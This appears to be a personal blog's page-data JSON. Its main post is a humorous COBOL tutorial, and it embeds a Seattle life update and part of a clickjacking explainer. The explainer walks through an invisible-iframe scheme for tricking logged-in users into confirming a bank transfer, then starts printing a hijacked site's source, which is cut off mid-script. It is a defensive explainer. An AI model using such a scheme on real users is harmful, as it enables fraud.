{"componentChunkName":"component---src-templates-post-template-js","path":"/cobol---the-hottest-programming-language-out-there","result":{"data":{"markdownRemark":{"html":"<p>Hey you.</p>\n<p>Do you wanna be a software engineer?</p>\n<p>Do you wanna work with one of the most in-demand and bleeding-edge technologies out there?</p>\n<p>Do you wanna create lots of <strong>POSITIVE IMPACT</strong> and <strong>SOCIAL CHANGE</strong>?</p>\n<p>Do you wanna live life in the <strong>fast lane</strong>?</p>\n<p>Well, I got the language for you if you wanna dance like it's 1959 again. Introducing COBOL, the language that makes C look like child's play.</p>\n<h2>What is it?</h2>\n<p>COBOL, or <strong>Co</strong>mmon <strong>B</strong>usiness-<strong>O</strong>riented <strong>L</strong>anguage, is a highly-verbose compiled language designed to run on mainframes powered by operating systems like z/OS from IBM. Designed in 1959, it was heavily inspired by the FLOW-MATIC language designed by Grace Hopper which features the same imperative and verbose syntax. The sole purpose of the language is to handle massive amounts of throughput in industries including airline ticketing, insurance claims, banking, and unemployment claims.</p>\n<p>So you might be wondering, why are we relying on such an old language to process business-critical transactions that affect millions of people? It is certainly not popular as indicated by its low ranking in the <a href=\"https://www.tiobe.com/tiobe-index/\" target=\"_blank\" rel=\"noopener noreferrer\">TIOBE Index</a> and with the advent of new/established languages such as Java, Python, and Go, new programmers have little reason to explore the world of COBOL.</p>\n<p>The interest to upgrade and change is there, but businesses that rely on COBOL are stuck between a rock and a hard place. First, the cost of replacing all of the existing infrastructure and code base with a newer language can be very time consuming and costly. In 2012, the Commonwealth Bank of Australia took on this <a href=\"https://www.reuters.com/article/us-usa-banks-cobol/banks-scramble-to-fix-old-systems-as-it-cowboys-ride-into-sunset-idUSKBN17C0D8\" target=\"_blank\" rel=\"noopener noreferrer\">herculian task to transition its systems from COBOL to SAP ABAP</a>. In total, the update took 5 whole years, 1 billion Australian dollars (USD 749 million), and the assistance of 2 other companies (Accenture and SAP). Upgrading isn't impossible, it's just extremely costly.</p>\n<p>According to <a href=\"http://fingfx.thomsonreuters.com/gfx/rngs/USA-BANKS-COBOL/010040KH18J/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">Reuters</a>, it seems that COBOL won't be going anywhere anytime soon. Also with the lack of COBOL developers to help with the migration, it looks like these systems would be here to stay for years to come. With the Coronavirus outbreak, the lack is more apparent than ever as unemployment processing systems in New Jersey were failing under the spike in unemployment claims. It's not that the system was failing its job, but the changing environment has made it inadequate.</p>\n<blockquote>\n<p>\"We have systems that are 40-plus years old. There’ll be lots of postmortems, and one of them will be <em>how the heck did we get here?,</em> when we literally needed COBOL programmers.\" - Gov. Murphy of New Jersey</p>\n</blockquote>\n<p>When I first heard him say this on the news, I thought it was a joke. I initially thought that a majority of our systems would've at least been upgraded to something newer, but I guess I was just uninformed.</p>\n<blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Unexpected <a href=\"https://t.co/A00tViNxJt\">pic.twitter.com/A00tViNxJt</a></p>&mdash; michael_nielsen (@michael_nielsen) <a href=\"https://twitter.com/michael_nielsen/status/1246577382347034625?ref_src=twsrc%5Etfw\">April 4, 2020</a></blockquote> <script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n<p>If COBOL is trending on Twitter, then you know it's serious.</p>\n<h2>Hello COBOL</h2>\n<p>Now that I've got you on board, time to teach you to become a full-fledge COBOL developer. So now, we will start with the most important step to becoming a COBOL developer, writing \"hello world\".</p>\n<p>But before that, we need to do a couple of things to get it up and running on your machine. For this guide, I will be using Ubuntu. This should work the same on the Windows WSL with Ubuntu.</p>\n<p>First, we need to install a COBOL compiler. For this, we will be installing <code class=\"language-text\">open-cobol</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> open-cobol</code></pre></div>\n<p>Now, we can begin writing our program. If you were to ask me what the program structure looks like, it is a cross of MIPS Assembly and FORTRAN. </p>\n<p>We start with different sections of the program. The <code class=\"language-text\">IDENTIFICATION DIVISION</code> is used to store program properties and the <code class=\"language-text\">PROCEDURE DIVISION</code> stores the functionality. Inside the <code class=\"language-text\">PROCEDURE DIVISION</code>, we will use the <code class=\"language-text\">DISPLAY</code> command to directly write to the screen. To end the program, we add the <code class=\"language-text\">STOP RUN</code> command at the end, much like adding <code class=\"language-text\">li $v0, 10</code> in MIPS.</p>\n<p>Open a new file in any editor and call it <code class=\"language-text\">hello.cob</code>. <code class=\"language-text\">*.cob</code> or <code class=\"language-text\">*.cbl</code> are file extensions for Cobol source files.</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">000000*&gt; My first COBOL program.\n000100 IDENTIFICATION DIVISION.\n000200*&gt; Identifies the name of the program\n000300 PROGRAM-ID. HELLO_WORLD.\n      \n      *&gt; Instructions go here\n      PROCEDURE DIVISION.\n        DISPLAY &#39;Hello from COBOL :)&#39;.\n        STOP RUN.</code></pre></div>\n<p>You may have noticed a couple of things about the code itself. The first 6 digits are reserved for line numbers that increment <code class=\"language-text\">100</code> per line. Comments are defined with <code class=\"language-text\">*&gt;</code>. Each program statement ends with a period, much like the English.</p>\n<p>To compile this program, simply use <code class=\"language-text\">cobc</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cobc -x hello.cob</code></pre></div>\n<p>The compiler should generate an executable file that you can simply execute with:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./hello</code></pre></div>\n<p>And there you have it, your first Cobol program!</p>\n<h2>Aspects of the Language</h2>\n<p>This will be a quick overview of different aspects of the programming language. If you're interested, I recommend taking a look at the references I used to understand the language. Surprisingly, the documentation isn't too bad.</p>\n<h3>Program Structure</h3>\n<ul>\n<li>Each line of the source file is offset 6 spaces to the right to account for the line numbers.</li>\n<li>Programs have different sections labeled with the <code class=\"language-text\">DIVISION</code> keyword to separate the responsibilities of each part of the program.</li>\n<li>\n<p>The first division is the <code class=\"language-text\">IDENTIFICATION DIVISION.</code> which stores the metadata that describes the program (<a href=\"https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_73/rzasb/iddiv.htm\" target=\"_blank\" rel=\"noopener noreferrer\">docs</a>).</p>\n<ul>\n<li>The <code class=\"language-text\">PROGRAM-ID</code> paragraph allows you to specify the name of the program (<a href=\"https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_73/rzasb/progid.htm\" target=\"_blank\" rel=\"noopener noreferrer\">docs</a>).</li>\n<li>There can be other paragraphs, but those are optional.</li>\n</ul>\n</li>\n<li>The second division is the <code class=\"language-text\">ENVIRONMENT DIVISION.</code>, which is an optional section where you can define program configuration and inputs/outputs (<a href=\"https://www.ibm.com/support/knowledgecenter/en/ssw_ibm_i_73/rzasb/envcfg.htm\" target=\"_blank\" rel=\"noopener noreferrer\">docs</a>).</li>\n<li>\n<p>The third section is the <code class=\"language-text\">DATA DIVISION.</code> that specifies the internal and external data the program will work with.</p>\n<ul>\n<li>The variables must be specified in the <code class=\"language-text\">WORKING-STORAGE SECTION.</code></li>\n</ul>\n</li>\n<li>Last but not least, the <code class=\"language-text\">PROCEDURE DIVISION.</code> is essentially the <code class=\"language-text\">main()</code> function of our program. All of our wonderful spaghetti code goes here.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">      IDENTIFICATION DIVISION.\n        PROGRAM-ID. MY-PROGRAM.\n      \n      DATA DIVISION.\n        WORKING-STORAGE SECTION.\n        *&gt; Variables go here.\n      \n      PROCEDURE DIVISION.\n        *&gt; Functionality goes here.</code></pre></div>\n<h3>Variables</h3>\n<p>Variables are pretty unique in COBOL. Instead of defining a type, it seems you specify what the variables hold as a composite of different types:</p>\n<ul>\n<li>A - alphabetic</li>\n<li>X - alphanumeric</li>\n<li>V - decimal</li>\n<li>S - sign</li>\n<li>9 - numeric</li>\n</ul>\n<p>For example, a floating-point number with 3 digits and 2 digits of precision would look something like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">        01 MY-FLOAT PIC S9(3)V9(2). VALUE +987.65.</code></pre></div>\n<p>Note that a value does not need to be specified for the variable. The best way I can sum up variable declaration is that we use the different symbols to represent the structure of the value that will be stored, much like how regex can be used to match different words/expressions.</p>\n<p>The numbers appearing on the left-hand side specify the level of the variable for nesting data just like how classes/struct can be used to wrap around other variables.</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">      01 PERSON-ADDRESS.\n        05 HOUSE-NUMBER PIC 9(4).\n        05 STREET PIC X(24).\n        05 CITY PIC X(24).\n        05 COUNTRY PIC X(24) VALUE &#39;BELGIUM&#39;.</code></pre></div>\n<p>This is a very brief overview of variables, but I highly recommend looking at <a href=\"https://www.ibm.com/support/knowledgecenter/SSUFAU_2.0.0/com.ibm.debugtool.doc/rmdita/rcmddco.html\" target=\"_blank\" rel=\"noopener noreferrer\">documentation from IBM</a> to learn more.</p>\n<h3>Conditionals</h3>\n<p>Conditionals are quite self-explanatory given how it reads like plain English barring a couple of symbols.</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">      PROCEDURE DIVISION.\n        *&gt; Initialize variables with numbers\n        MOVE 30 TO A.\n        MOVE 20 TO B.\n        MOVE 30 TO C.\n        \n        IF A &gt; B THEN\n            DISPLAY &#39;A &gt; B&#39;\n            IF A = C THEN\n                DISPLAY &#39;A = C&#39;\n            ELSE\n                DISPLAY &#39;A != C&#39;\n            END IF.\n        ELSE\n            DISPLAY &#39;A &lt;= B&#39;\n        END IF.</code></pre></div>\n<p>For switch statements, we specify the value to <code class=\"language-text\">switch</code> on (statement in Java) to be <code class=\"language-text\">True</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">      EVALUATE TRUE\n        WHEN A &lt; 20\n            DISPLAY &#39;A IS LESS THAN 20&#39;\n        WHEN A &lt; 30\n            DISPLAY &#39;A IS LESS THAN 30&#39;\n        WHEN A &lt; 40\n            DISPLAY &#39;A IS LESS THAN 40&#39;\n      END-EVALUATE.</code></pre></div>\n<p>Conditionals can also be combined with <code class=\"language-text\">NOT</code>, <code class=\"language-text\">AND</code>, <code class=\"language-text\">OR</code>, and some others.</p>\n<div class=\"gatsby-highlight\" data-language=\"cobol\"><pre class=\"language-cobol\"><code class=\"language-cobol\">      IF A IS LESS THAN B AND A IS LESS THAN 50 THEN\n        DISPLAY &#39;THIS IS IN FACT TRUE&#39;\n      ELSE\n        DISPLAY &#39;THIS SHOULD NOT SHOW&#39;\n      END-IF.\n      \n      *&gt; Combined conditional without else\n      IF A IS POSITIVE OR A IS NEGATIVE THEN\n        DISPLAY &#39;A IS POSITIVE OR NEGATIVE&#39;.</code></pre></div>\n<p>For further reference, there is a lot written about <a href=\"https://www.ibm.com/support/knowledgecenter/SSUFAU_1.0.0/com.ibm.debugtool.doc/rmdita/rcmdico.html\" target=\"_blank\" rel=\"noopener noreferrer\">how to implement conditionals</a>.</p>\n<p>There are a lot of other aspects of the language not shown here such as commands, strings, loops, file I/O, etc. </p>\n<h3>Now for the important question.</h3>\n<p><strong>Can COBOL be used for Leetcode?</strong> Absolutely. Allow me to demonstrate.</p>\n<p>For today's problem, we will be doing <a href=\"https://leetcode.com/problems/power-of-three/\" target=\"_blank\" rel=\"noopener noreferrer\">Leetcode 326</a>. <em>Given an integer, write a function to determine if it is a power of three.</em> And for the follow-up, <em>could you do it without using any loop / recursion?</em></p>\n<p>For the solution below, we will accomplish both. The first solution that comes to keep dividing the given number, <code class=\"language-text\">n</code>, by 3 and see if the remainder is 0 at the end. However, that did not fit in with the follow-up and I got too tired to figure out how to write a loop, so we will use the change of base formula instead.</p>\n<p>i = log<sub>b</sub>(n)/log<sub>b</sub>(3)</p>\n<p><img src=\"https://raw.githubusercontent.com/Spiderpig86/blog/master/images/cobol/code.png\" alt=\"code\"></p>\n<p>I seriously hope they never ask Leetcode questions in COBOL. Ever.</p>\n<h2>References</h2>\n<ul>\n<li><a href=\"https://developer.ibm.com/technologies/cobol/\" target=\"_blank\" rel=\"noopener noreferrer\">https://developer.ibm.com/technologies/cobol/</a></li>\n<li><a href=\"https://devdocs.io/gnu_cobol/\" target=\"_blank\" rel=\"noopener noreferrer\">https://devdocs.io/gnu_cobol/</a></li>\n<li><a href=\"https://www.tutorialspoint.com/cobol/index.htm\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.tutorialspoint.com/cobol/index.htm</a></li>\n<li><a href=\"https://www.govtech.com/computing/As-Unemployment-Claims-Spike-New-Jersey-Seeks-COBOL-Coders.html\" target=\"_blank\" rel=\"noopener noreferrer\">https://www.govtech.com/computing/As-Unemployment-Claims-Spike-New-Jersey-Seeks-COBOL-Coders.html</a></li>\n</ul>","timeToRead":8,"fields":{"slug":"/posts/2020-05-03-cobol---the-hottest-programming-language-out-there/"},"frontmatter":{"date":"May 03, 2020","path":"/cobol---the-hottest-programming-language-out-there","tags":["cobol","programming","code","tutorial"],"title":"COBOL — The Hottest Programming Language Out There","image":null,"description":"COBOL is the past, present, and future."}},"site":{"siteMetadata":{"siteUrl":"https://spiderpig86.github.io"}}},"pageContext":{"slug":"/posts/2020-05-03-cobol---the-hottest-programming-language-out-there/","prev":{"node":{"excerpt":"👋 hey guys.it's been a while. there have been a serious lack of posts the past ~7 months and I hope to change that.a lot has happened in the past few months:  Australian wildfires, Iran, uncertain political climate, tumbling markets, and of course…","html":"<p>👋 hey guys.</p>\n<p>it's been a while. there have been a serious lack of posts the past ~7 months and I hope to change that.</p>\n<p>a lot has happened in the past few months:  Australian wildfires, Iran, uncertain political climate, tumbling markets, and of course, Coronavirus.</p>\n<p>let's just hope we'll be ok. lol.</p>\n<p>In all seriousness, a lot has changed in the past 3 months. First, I graduated. Second, I moved to the emerald city. Third, I started my job at AWS. </p>\n<p>And side note, <a href=\"https://polaritybrowser.netlify.com\" target=\"_blank\" rel=\"noopener noreferrer\">Polarity 10</a> is out. Y'all better check it out 💎.</p>\n<h3>moving.</h3>\n<p>To say this wasn't a big adjustment would just be a straight lie. Despite having lived here prior for ~3 months, picking up my entire life from one place to the next is much easier said than done. There was a lot of planning involved in what to purchase and coordinating with the building manager on how to handle items being shipped there before I arrived. Having landed in Seattle before 💩 hit the fan, I was spared the excess crowds and lack of necessities at Costco.</p>\n<p>Everything had to be either delivered or transported using Lyft, which meant that cost was sky-high.  Seriously, I don't think I've spent more time and money in a month than the two months I spent physically moving and buying all the things I needed. Luckily, I was able to explore much of Seattle's food scene while I waited for the rest of my kitchen supplies to get shipped. Streets were filled despite the cold and at this time, the panic didn't hit anyone. Things were looking pretty good.</p>\n<h3>beer virus.</h3>\n<p>Things were looking less good by early March. Infections were picking up in the Seattle area without any sign of slowing down. Businesses started to close, some employees were told to work from home if they presented symptoms, and some woke up to find that they lost their jobs. Test kits were scarce but the panic still hasn't set in. Stores were still stocked with goods, restaurants were still open, and I went to a party. Maybe you'll see a couple of people here and there wearing masks, but that's about it. Pretty much everyone was either unable to get one or <strong>kept perpetuating the idea that they are largely ineffective</strong>. Over the next few days, the traffic on the I-5 became sparse and the office became relatively quiet. Four days into March, Amazon released an official statement for those who can remote should do so.</p>\n<p>In mid-March, supermarkets started to run low on supplies as everyone bought copious amounts of toilet paper and non-perishables. Overnight, toilet paper became the symbol of power, wealth, and influence as a new post-apocalyptic society was propped up favoring the toilet-paper rich. <em>Just kidding</em>. Costco ultimately became the symbolism of mass hysteria and panic buying when customers started to <a href=\"https://nextshark.com/costco-rice-panic-buying-food/\" target=\"_blank\" rel=\"noopener noreferrer\">demand refunds on their extra goods</a>.</p>\n<p>When it came to the virus, I think Tom Hanks contracting it and the NBA suspending its entire season struck a chord with most Americans. It was no laughing matter at this point. Walking through the streets of Seattle suddenly felt unnatural. There was no honking at rush hour, no tourists at Pike Place Market, and no customers at shops and restaurants.</p>\n<p>When it came to grocery shopping, one of the hardest hit were businesses of the Asian community. While there were long lines at Costco, Target, and QFC, Asian grocery stores such as Uwajimaya and Hmart saw steady to even sometimes fewer customers. Don't get me wrong, I thought it was great not having to wait in long lines just to check out a couple of items. But it does raise the question of how long these businesses can sustain themselves with <strong>no</strong> line.</p>\n<h3>some positives.</h3>\n<p>As spread continued to worsen in other parts of the country, there was at least some hope at the original epicenter. The overall number of people contracting and dying from COVID-19 began to slow down, with death rates going from <strong>doubling every 3 days</strong> to <strong><a href=\"https://www.nytimes.com/interactive/2020/03/21/upshot/coronavirus-deaths-by-country.html?action=click&#x26;module=moreIn&#x26;pgtype=Article&#x26;region=Footer\" target=\"_blank\" rel=\"noopener noreferrer\">doubling every 13 days</a></strong> at the time of me writing this. It still isn't great, but it is comforting to see that progress is being made. This doesn't mean that it is completely safe, but comforting knowing that we may no longer be confined indoors.</p>\n<p>Summers are truly a blessing in Seattle and it's just around the corner. Seattle only gets 152 sunny days per year versus the US average of 205 days and you will be way better off heading out whenever you can. Just imagine this: little to no thunderstorms, constantly sunny, daily highs in the 70s (and no hotter), bearable humidity, and darkness setting in at 10 pm. This lasts for about maybe until October and then it's back to shitty weather. I seriously cannot wait to head out to explore.</p>\n<p>Stay indoors and wash your hands.</p>","id":"f0c79373-0dd2-5c2e-8dbd-91ec20f8d4c5","fields":{"slug":"/posts/2020-4-12-seattle.rain.corona/"},"frontmatter":{"date":"2020-04-12T18:16:42.177Z","path":"/seattle.rain.corona","title":"seattle. rain. corona.","description":"A brief update to my life.","tags":["seattle","moving","amazon","life"]}}},"next":{"node":{"excerpt":"What is it?Having been around since 2002, Clickjacking or \"UI redressing\" is a technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent…","html":"<h2>What is it?</h2>\n<p>Having been around since 2002, Clickjacking or \"UI redressing\" is a technique that utilizes multiple opaque or transparent layers, usually iframes, to trick users into clicking buttons or entering information without any malicious intent. In turn, the content rendered in these frames could lead to malicious content on another page (masking as a legitimate download site, banking site, etc.) Typically, these attacks are carried out by those who own the domain and set up a website for malicious purposes. The other way that this type of attack can work is if an attacker takes over an expired domain or the hacker somehow accesses your web hosting account, CMS, etc. (if this happens, you may want to consider changing your credentials for every account you own).</p>\n<h2>An Example</h2>\n<p>Sounds a bit confusing? Let's use a simple example. You want to download an unreleased version of <em>The Room 2</em>, the sequel to Tommy Wiseau's masterpiece from 2003. You know of a way to get the movie from a <em>safe</em> and <em>legitimate</em> website in a <em>totally legal 100%</em> way on <a href=\"http://totallylegitsafemoviedownload.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://totallylegitsafemoviedownload.com</a>. Now you must be thinking, there shouldn't be any issues given that the word \"safe\" is in the name. It probably uses ad revenue to plant trees around the world ravaged by illegal deforestation and totally does not track and store your information to later resell it for profit. Given these assumptions, you reassure yourself it'll all be ok to click the big green flashing DOWNLOAD NOW button because nothing screams free movie plus a side of adware more than this.</p>\n<p>Little did you know there was a transparent overlaid iframe on top of that button that takes you to a <strong>fake page</strong>.</p>\n<p><img src=\"https://i.kym-cdn.com/photos/images/original/000/692/118/2db.jpg\" alt=\"Ruse\"></p>\n<p>A new tab opens and at this point, the only thing separating you and quality entertainment is a single spinner in the middle of the page with a message at the top saying, \"Preparing your super fast 1000 TB/s download from our 100% uptime hosts...\"</p>\n<p><img src=\"https://media1.tenor.com/images/2676bbb3b2f48a87d7f90aaf8390a8f9/tenor.gif?itemid=10466614\" alt=\"Yes Spongebob GIF - Yes Spongebob Plankton GIFs\"></p>\n<p>But wait! A modal pops up. It reads, \"Puppies around the world are in dire need of treats. Your donation can help feed millions of treat deprived puppies year-round.\"</p>\n<p>Being the benevolent netizen you are, you enter your name, address, phone number, credit card number, an amount of $10, social security number, biggest fear, and your SAT math score because who else will think of the puppies. You think to yourself: I did a good today.</p>\n<p>The modal exits and the spinner disappears. A blank screen of mockery lies before you. You think maybe it will reappear after a few seconds. It doesn't. Ok, maybe a few minutes. It still doesn't. Shit.</p>\n<p>Even though this is a very extreme case of falling for a clickjacking attack, the overall idea of how it works remains the same in pretty much all cases. However this technique has morphed into other subcategories that include <strong>likejacking</strong> (for you social media addicts), <strong>nested</strong> (Google+ targeted), <strong>cursorjacking</strong>, <strong>mousejacking</strong>, <strong>browserless</strong>, <strong>cookiejacking</strong>, <strong>filejacking</strong>, and <strong>password manager attacks</strong> (takes advantage of the fact that your password manager auto-fills forms for you).</p>\n<h2>Real Life Encounter</h2>\n<p>While browsing Google Maps for restaurants, I stumbled across a dim sum place I've never tried before. On the left panel, Google Maps listed the usual information -- name, address, website, etc. Since I usually check every website for a menu, I opened the link.</p>\n<p>I thought to myself, this had to be the strangest website I've ever seen. Rather than being greeted with maybe a slightly outdated design with a carousel of food pictures, instead, I was assaulted with a plethora of flashing banners, promises of riches, and poor color choices. This was not a dim sum website -- this was an online Chinese casino.</p>\n<p>For cases like these, it is very easy to tell since the content you see is drastically different than what you were expecting. Most people would be able to pick up this difference and safely navigate away from the page. However, clickjacking comes in much more nefarious flavors where iframes are carefully placed across pages to make you believe that the action you are performing is for the site you are on and not some shady page.</p>\n<h2>How It Works</h2>\n<p>Despite showing the address of the page you expect, you can tell that the page loaded is completely different for this example. However, this tactic can be quite effective for phishing the average internet user when done correctly -- given that the phishing page is made convincing enough.</p>\n<p>I did some experimentation to see if this exploit worked on both HTTP and HTTPS -- which it does. The one thing I discovered that stops this from being an effective attack vector is the use of <code class=\"language-text\">X-Frame-Options</code>.</p>\n<h3>X-Frame-Options</h3>\n<p><code class=\"language-text\">X-Frame-Options</code> is an HTTP response header or security header that dictates if the request page in the iframe is allowed to be loaded. It applies to any HTML element that can display content from some other sites, such as <code class=\"language-text\">&lt;frame&gt;</code>, <code class=\"language-text\">&lt;iframe&gt;</code>, <code class=\"language-text\">&lt;embed&gt;</code>, and <code class=\"language-text\">&lt;object&gt;</code> to prevent clickjacking attacks from happening.</p>\n<p>This header can be set with 3 different values:</p>\n<ul>\n<li><code class=\"language-text\">DENY</code> - the page can never be loaded in an iframe.</li>\n<li><code class=\"language-text\">SAMEORIGIN</code> - the page can only load in an iframe as long as the host page is in the same origin.</li>\n<li><code class=\"language-text\">ALLOW-FROM &lt;uri&gt;</code> - this no longer works and this is <strong>bad</strong>. Don't ever use it. It is only here to support older browsers. This is why we cannot have nice things.</li>\n</ul>\n<p>Given the first two options, this means that your local script kiddie can't scam others online with an iframe displaying the Paypal \"donate\" button with the form prefilled with $1000. Let me explain how this sophisticated hacker can launch the attack:</p>\n<ol>\n<li>Some Fortnite player, Alice, is bored and wants to get some kick out of scamming other players. They decide to use their script-kiddie skills to whip up a convincing-looking website that promises players rare skins for <strong>free</strong>. For this example, our victim is named Bob.</li>\n<li>Alice knows that some bank does not use <code class=\"language-text\">X-Frame-Options</code> to protect their website, which means that this will be the target audience for the attack.</li>\n<li>In the background, a script is executed to check if Bob is logged into the bank that the attacker is targeting. If so, an invisible iframe is loaded up prefilled with a corresponding transfer amount. The iframe is positioned in such a way that the  \"Confirm Transfer\" button is super-imposed on the \"Download\" button for each skin.</li>\n<li>Bob opens the site and selects a skin. The skin is shown on a page with a big green flashing download button in the center. Bob clicks on it thinking he'll be the coolest player out of his friend group, not knowing he made a huge mistake.</li>\n<li>The bank page proceeds to process the transaction while Bob ends up downloading a text file containing some bull sh*t instructions on how he can redeem the skin with a fake product code.</li>\n</ol>\n<h3>The Code</h3>\n<p>So Stan, where's the code? Glad you asked.</p>\n<p>The execution of this attack is slightly different than the previous approaches I've mentioned. In short, what the script does is hide all the contents of the legitimate version of the website and creates an iframe showing the Chinese online casino page. Now, this is quite obvious to anyone that this website has nothing to do with this casino. However, this technique could be used to superimpose a realistic-looking page acting as the website (this can be done if the owner's account for the hosting company was compromised and an attacker set up the clickjacking attack to lure people into handing over money).</p>\n<p>When I opened the source code of the page, it was just normal looking Bootstrap templates with a couple of red flags. Other than some other weird JS being executed, I isolated the snippet of code where the clickjacking script lives:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\">&lt;!DOCTYPE html></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Title Page<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>keywords<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>description<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>author<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n    <span class=\"token comment\">&lt;!-- Some 百度 Analytics Code --></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">var</span> bp<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"script\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> curProtocol<span class=\"token operator\">=</span>window<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>protocol<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>curProtocol<span class=\"token operator\">===</span><span class=\"token string\">\"https\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>bp<span class=\"token punctuation\">.</span>src<span class=\"token operator\">=</span><span class=\"token string\">\"https://zz.bdstatic.com/linksubmit/push.js\"</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>bp<span class=\"token punctuation\">.</span>src<span class=\"token operator\">=</span><span class=\"token string\">\"http://push.zhanzhang.baidu.com/push.js\"</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">var</span> s<span class=\"token operator\">=</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByTagName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"script\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">.</span>parentNode<span class=\"token punctuation\">.</span><span class=\"token function\">insertBefore</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">,</span>s<span class=\"token 